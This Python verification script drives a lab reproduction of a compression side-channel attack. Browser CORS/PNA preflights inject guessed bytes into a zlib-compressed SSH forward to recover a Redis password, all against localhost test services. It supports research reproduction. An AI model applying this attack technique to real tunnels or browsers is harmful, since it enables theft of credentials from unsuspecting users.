"""End-to-end verification for the PNA browser-injection scenario
(Section 5.2 "Restricted Plaintext Injection Oracle in CORS-PNA"; Section 7.1).

Run from the host while the docker-compose stack is up:

    python scripts/verify_browser_pna.py
    python scripts/verify_browser_pna.py --password market --seed-len 2

Unlike verify_browser.py (Firefox, body injection), this drives the pinned
PNA-enforcing Chromium. The guess rides in the OPTIONS preflight's URL path,
which restricts the injectable alphabet to bytes with no CR/LF -- so the
password length, pw0 and pw1 sit behind the CR/LF wall and are SEEDED here
(their real-attack brute-force cost is reported analytically). The tail
pw2..pw(n-1) is recovered for real, length-bounded, through the live preflight
oracle.

Checks:
  * HTTP control APIs reachable; SSH up with zlib; Redis tunnel active.
  * PNA Chromium connected (client + attacker WebSocket bridge).
  * A genuine CORS/PNA OPTIONS preflight carrying the guess bytes traverses the
    SSH forward: the browser reports the fetch was blocked, and the c->s SSH
    wire volume scales with the path length (the attacker-controlled path bytes
    are what cross the forward -- not just "some packets appeared").
  * Length-bounded recovery of the tail equals password[seed_len:], and the
    full password reconstructs as seed + tail.
"""

from __future__ import annotations

import argparse
import json
import string
import sys
import time
import urllib.error
import urllib.request

ATTACKER_BASE = "http://127.0.0.1:9000"
CLIENT_BASE = "http://127.0.0.1:8000"


def http(method: str, url: str, body: bytes | None = None,
         content_type: str | None = None, timeout: float = 3600.0) -> dict:
    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, method=method, data=body, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
    if not raw:
        return {}
    return json.loads(raw)


def wait_for(url: str, label: str, timeout: float = 60.0) -> None:
    deadline = time.time() + timeout
    last_err: Exception | None = None
    while time.time() < deadline:
        try:
            http("GET", url)
            print(f"  [ok] {label} reachable")
            return
        except (urllib.error.URLError, ConnectionResetError, OSError) as exc:
            last_err = exc
            time.sleep(1.0)
    raise SystemExit(f"!! {label} never came up: {last_err}")


def step(title: str) -> None:
    print()
    print("=" * 72)
    print(title)
    print("=" * 72)


def fail(msg: str) -> "NoReturn":  # type: ignore[name-defined]
    print(f"FAIL: {msg}")
    sys.exit(1)


def pna_attack(known_prefix: str, alphabet: str, max_length: int,
               expected: str | None, min_margin: int | None) -> dict:
    config: dict = {
        "known_prefix": known_prefix,
        "alphabet": alphabet,
        "max_length": max_length,
    }
    if min_margin is not None:
        config["min_margin"] = min_margin
    body_obj: dict = {"scenario": "browser_pna", "config": config}
    if expected is not None:
        body_obj["expected"] = expected
    body = json.dumps(body_obj).encode("utf-8")
    return http("POST", f"{ATTACKER_BASE}/run_attack", body=body,
                content_type="application/json")


def print_bootstrap_cost(alphabet: str, seed_len: int, password_len: int) -> None:
    """Report the analytical brute-force cost of the SEEDED bytes (§7), kept
    strictly separate from the measured tail guess count."""
    A = len(alphabet)
    print()
    print("  --- Analytical seeded-bootstrap cost (NOT measured) ---")
    print(f"  Seeded bytes: {{length, pw0, pw1}} (the CR/LF-walled prefix).")
    print(f"  Alphabet size A = {A}.")
    # pw0, pw1 cannot be leaked (need \\r\\n in their left context), so a real
    # attacker brute-forces the leading pair and detects correctness by whether
    # pw2 then recovers cleanly -- an O(A^2)..O(A^3) search through the same
    # oracle (§7).
    print(f"  pw0,pw1 leading pair : O(A^2)..O(A^3) = {A**2}..{A**3} candidate "
          f"anchors through the length/recovery oracle.")
    # The length digit(s) are likewise un-leakable; bounded brute force over
    # plausible lengths (here the seeded length is {password_len}).
    print(f"  length               : bounded brute force over plausible lengths "
          f"(seeded here as {password_len}).")
    print("  These are stated analytically; only the tail pw2..pw(n-1) below is "
          "measured through the live PNA preflight oracle.")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--password", default="market",
                    help="target password (smoke default: 'market'). No length "
                         "is baked in; max_length is derived from it.")
    ap.add_argument("--seed-len", type=int, default=2,
                    help="number of seeded leading password bytes (pw0..). The "
                         "CR/LF wall makes exactly the first two un-leakable, so "
                         "2 is the sanctioned boundary; do not seed past pw1.")
    ap.add_argument("--alphabet", default=string.ascii_lowercase + string.digits,
                    help="recovery alphabet for the tail (default: lowercase + "
                         "digits). Must be URL-path-safe.")
    ap.add_argument("--min-margin", type=int, default=None,
                    help="override the adapter's default commit margin.")
    args = ap.parse_args()

    password = args.password
    seed_len = args.seed_len
    if seed_len < 1 or seed_len >= len(password):
        fail(f"seed-len {seed_len} invalid for password of length {len(password)}")
    # Anti-shortcut boundary (Section 7): only {length, pw0, pw1} sit behind the
    # CR/LF wall and may be seeded. Seeding pw2 or later would hand the oracle
    # bytes it is supposed to recover -- an unsanctioned shortcut. Enforce it in
    # code, not just in the docstring.
    if seed_len > 2:
        fail(f"seed-len {seed_len} exceeds the sanctioned boundary of 2: only "
             f"the CR/LF-walled {{length, pw0, pw1}} may be seeded; recovering "
             f"pw2..pw(n-1) must go through the live oracle.")
    seed = password[:seed_len]
    tail = password[seed_len:]

    step("1. Wait for HTTP control APIs")
    wait_for(f"{ATTACKER_BASE}/status", "attacker")
    wait_for(f"{CLIENT_BASE}/status", "client")

    step("2. Inspect client SSH state")
    cs = http("GET", f"{CLIENT_BASE}/status")
    print(json.dumps(cs, indent=2))
    if not cs.get("ssh_connected"):
        fail("client reports ssh_connected=false")
    send_alg = cs.get("ssh_send_compression")
    if send_alg not in ("zlib", "zlib@openssh.com"):
        fail(f"send compression is {send_alg!r}, expected zlib*")
    print(f"  [ok] compression: {send_alg}")
    if not cs.get("port_forwards", {}).get("redis_tunnel", {}).get("active"):
        fail("Redis tunnel port forward not active")
    print("  [ok] Redis tunnel active")
    if not cs.get("browser_pna_connected"):
        fail("client reports browser_pna_connected=false (Chromium not launched)")
    print("  [ok] PNA Chromium launched")

    step("3. Inspect attacker state")
    asn = http("GET", f"{ATTACKER_BASE}/status")
    print(json.dumps(asn, indent=2))
    if not asn.get("browser_pna_connected"):
        fail("attacker reports browser_pna_connected=false (WebSocket not up)")
    print("  [ok] PNA browser connected to attacker via WebSocket")

    step("4. Verify a genuine PNA preflight carries the guess bytes on the wire")
    probe = http("POST", f"{ATTACKER_BASE}/pna_probe",
                 body=json.dumps({"marker": "PROBEMARKER", "prefill_bytes": 8192}).encode(),
                 content_type="application/json")
    print(json.dumps(probe, indent=2))
    small, large = probe.get("small", {}), probe.get("large", {})
    # (a) The fetch was blocked -> a real CORS/PNA preflight was sent and denied
    #     (a non-preflighted, allowed request would not reject like this).
    if not (small.get("rejected") and large.get("rejected")):
        fail("PNA preflight was not blocked (rejected != true) -- the browser is "
             "not enforcing the cross-origin preflight; body injection would be "
             "possible and this would not be a PNA demonstration")
    print("  [ok] preflight fetch blocked (rejected=true) -> genuine CORS/PNA preflight")
    # (b) The c->s SSH volume scales with the path length -> the attacker's path
    #     bytes are what traverse the forward, not fixed framing noise.
    c2s_small = small.get("c2s_bytes", 0)
    c2s_large = large.get("c2s_bytes", 0)
    if not (c2s_large > c2s_small and c2s_large > 500):
        fail(f"c->s wire bytes did not scale with the preflight path length "
             f"(small={c2s_small}, large={c2s_large}); cannot confirm the guess "
             f"bytes traversed the SSH forward")
    print(f"  [ok] c->s wire volume scales with path length "
          f"(short path -> {c2s_small} B, long path -> {c2s_large} B): "
          f"the OPTIONS preflight carrying the guess bytes traversed the SSH forward")

    step(f"5. Set target password {password!r} and confirm packet capture")
    http("POST", f"{CLIENT_BASE}/set_secret",
         body=json.dumps({"value": password}).encode("utf-8"),
         content_type="application/json")
    time.sleep(2.0)
    http("POST", f"{ATTACKER_BASE}/clear_log")
    http("POST", f"{ATTACKER_BASE}/trigger_secret")
    time.sleep(0.4)
    log = http("GET", f"{ATTACKER_BASE}/packet_log")
    if not log["records"]:
        fail("no TCP segments observed during Redis AUTH")
    print(f"  [ok] {log['count']} segments captured during AUTH")

    step("6. PNA browser-injection attack: recover the tail (length-bounded)")
    print(f"  seed (pw0..pw{seed_len-1}) = {seed!r}  (seeded, un-leakable)")
    print(f"  tail to recover           = {tail!r}  ({len(tail)} bytes, real oracle)")
    t0 = time.time()
    r = pna_attack(
        known_prefix=seed,
        alphabet=args.alphabet,
        max_length=len(tail),
        expected=tail,
        min_margin=args.min_margin,
    )
    recovered_tail = r["recovered"]
    elapsed = time.time() - t0
    full = seed + recovered_tail

    print()
    print(f"  recovered tail : {recovered_tail!r}  (measured: "
          f"{r.get('total_guesses')} guesses, {r.get('elapsed_seconds', 0):.1f}s)")
    if r.get("aborted"):
        print(f"  ABORTED: {r.get('abort_reason')}")
    print(f"  full password  : {full!r}  (= seed {seed!r} + tail {recovered_tail!r})")
    print(f"  expected       : {password!r}")

    print_bootstrap_cost(args.alphabet, seed_len, len(password))

    status = "PASS" if (recovered_tail == tail and full == password) else "FAIL"
    print()
    print(f"  Total wall time: {elapsed:.1f}s")
    print(f"  Status:         {status}")
    return 0 if status == "PASS" else 1


if __name__ == "__main__":
    sys.exit(main())
